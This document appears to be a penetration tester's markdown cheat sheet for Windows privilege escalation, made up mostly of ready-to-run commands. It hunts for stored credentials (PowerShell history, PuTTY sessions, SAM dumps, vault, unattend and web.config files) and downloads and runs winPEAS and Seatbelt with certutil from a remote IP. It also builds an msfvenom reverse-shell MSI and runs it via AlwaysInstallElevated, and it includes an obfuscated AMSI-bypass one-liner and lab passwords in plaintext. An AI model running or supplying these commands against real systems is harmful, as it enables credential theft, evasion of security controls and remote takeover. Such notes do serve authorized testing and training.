```powershell 
whoami
whoami /groups
systeminfo
ipconfig /all
route print
netstat -ano
tasklist
query user ##active user

###Identify path of process binary
powershell -command "Get-Process <ProcessName> | Select-Object Path"

Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember adminteam
Get-LocalGroupMember Administrators
Get-Process

###Installed Application
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

###If putty installed we can extract plaintext creds
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

```

### PowerShell history
```powershell
Get-History
(Get-PSReadlineOption).HistorySavePath
type C:\Path\To\consoleHost_history.txt

###Only work from cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
### Hidden in Plain View

###### hidden sensitive file 
```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\xampp -Include backup*,cred* -Dir -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\<Username>\AppData\ -Include *.txt -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.log,*.zip,*ps1m,*.dump,*.dmp,*.vbs,*.ps1,*.db,*.bak -File -Recurse -ErrorAction SilentlyContinue

###show hiddent files
Get-ChildItem -Hidden
dir /a:h  ##for cmd

(Get-ChildItem C:\Users\ -Recurse | Select-String -Pattern "NTLM") 2>$null

Get-ChildItem -Path C:\ -Include *.txt, *.ini -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "config|password|secret" }

###Location need to be checked:
dir C:\Users\<Username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\
```

### Event Viewer
###Event Viewer  (to search for events recorded by Script Block Logging)

*Note: Script Block Logging typically logs events with specific IDs. You might want to look for Event ID `4104`, which is commonly associated with Script Block Logging.*
1. Navigate to `Event Viewer` > `Applications and Services Logs` > `Microsoft` > `Windows` > `PowerShell`
2. Select "Filter Current Log" In the filter window, you can enter the Event ID (like `4104`) to narrow down the results.

### Automation Scans
```powershell
certutil.exe -urlcache -split -f http://192.168.45.191:8000/winPEASx64.exe winpeas.exe
.\winpeas.exe

certutil.exe -urlcache -split -f http://192.168.45.191:8000/Seatbelt.exe Seatbelt.exe
.\Seatbelt.exe -group=all
```
### Schedule task
```powershell
schtasks /query /fo LIST /V
schtasks /query /fo LIST /v | Select-String -Pattern "TaskName:"
schtasks /query /fo LIST /v | Select-String -Pattern "Task To Run:"
schtasks /query /fo LIST /v | Select-String -Pattern "Task To Run:|Run As User:"
schtasks /query /tn vulntask /fo list /v

schtasks /query /fo LIST /v /tn \Microsoft\CacheCleanup
icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
```
### Common Commands
```
shutdown /r /t 0
```
### Sam Dump
```python
secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
```
### Credential Manager
```powershell
vaultcmd /list
VaultCmd /listproperties:"Web Credentials"
VaultCmd /listcreds:"Web Credentials"
```

![[Pasted image 20241022111235.png]]
[+] https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1 This script can be used to retreive web credentiaks stored in Windows Valut from Windows 8 onwards. The script also needs PowerShell v3 onwards and must be run from an elevated shell.


### Unattended Windows Installations
```powershell
###Location where credentials can be found:
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

### Saved Windows Credentials
-> Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials:
```powershell
cmdkey /list
```
-> While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the runas command and the /savecred option, as seen below.
```powershell
runas /savecred /user:admin cmd.exe
```

### IIS Configuration
The configuration of websites on IIS is stored in a file called `web.config` and can store passwords for databases or configured authentication mechanisms. we can find web.config in one of the following locations:
- C:\inetpub\wwwroot\web.config
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```powershell
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

### AlwaysInstallElevated

1.  This method requires two registry values to be set. You can query these from the command line using the commands below.
```c
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
2. To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible. If these are set, you can generate a malicious `.msi` file using `msfvenom`, as seen below:
```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```
3. you can run the installer with the command below and receive the reverse shell:
```shell-session
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```


#####Credential Object
```powershell
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
```

```
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} )
```

'''
bloodhound-python -d 'LAB.TRUSTED.VL' -u 'rsmith' -p 'IHateEric2' -ns 127.0.0.1 -dc labdc.LAB.TRUSTED.VL -c all --zip
'''

